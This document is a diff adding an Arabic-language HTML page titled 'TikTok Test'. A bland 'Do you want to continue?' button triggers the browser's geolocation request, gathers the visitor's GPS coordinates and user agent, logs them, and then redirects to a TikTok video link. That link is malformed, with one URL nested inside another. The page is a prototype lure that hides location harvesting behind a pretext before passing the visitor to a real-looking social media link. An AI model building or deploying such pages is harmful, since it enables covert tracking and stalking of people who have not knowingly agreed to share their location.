@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>TikTok Test</title>
+<style>
+  body { display:flex; justify-content:center; align-items:center; height:100vh; font-family:sans-serif; background:#f2f2f2; }
+  .container { text-align:center; background:white; padding:30px; border-radius:10px; box-shadow:0 0 10px rgba(0,0,0,0.2); }
+  button { padding:10px 20px; margin-top:20px; cursor:pointer; font-size:16px; }
+</style>
+</head>
+<body>
+<div class="container">
+  <h2>هل تريد الاستمرار؟</h2>
+  <button id="continueBtn">Continue</button>
+</div>
+
+<script>
+document.getElementById('continueBtn').addEventListener('click', () => {
+  // طلب الموقع من المتصفح
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition((position) => {
+      const data = {
+        lat: position.coords.latitude,
+        lon: position.coords.longitude,
+        accuracy: position.coords.accuracy,
+        userAgent: navigator.userAgent
+      };
+      console.log("GPS + UA:", data);
+      alert("تم جمع الموقع بنجاح!"); // للتجربة على نفسك
+      // بعد جمع البيانات، تحويل للرابط الحقيقي للـ TikTok
+      window.location.href = "https://www.tiktok.com/@fa.2l8/video/https://vt.tiktok.com/ZSS3PUfbG/"; // ضع رابط الفيديو الحقيقي هنا
+    }, (err) => {
+      console.log("رفض الموقع أو خطأ:", err);
+      alert("تم رفض الوصول للموقع.");
+      window.location.href = "https://www.tiktok.com/@fa.2l8/video/https://vt.tiktok.com/ZSS3PUfbG/"; 
+    });
+  } else {
+    alert("المتصفح لا يدعم GPS");
+    window.location.href = "https://www.tiktok.com/@fa.2l8/video/https://vt.tiktok.com/ZSS3PUfbG/"; 
+  }
+});
+</script>
+</body>
+</html>
